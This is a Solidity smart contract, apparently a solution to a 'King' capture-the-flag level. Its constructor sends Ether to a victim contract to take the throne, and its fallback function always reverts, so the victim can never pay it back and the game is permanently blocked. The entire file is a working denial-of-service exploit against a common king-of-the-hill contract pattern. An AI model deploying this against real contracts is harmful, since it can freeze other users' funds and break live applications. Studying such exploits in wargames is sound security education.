// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker {
    constructor(address _victimContractAddress) payable {
        address(_victimContractAddress).call{value: msg.value}("");
    }

    fallback() external payable {
        revert("No way man!");
    }
}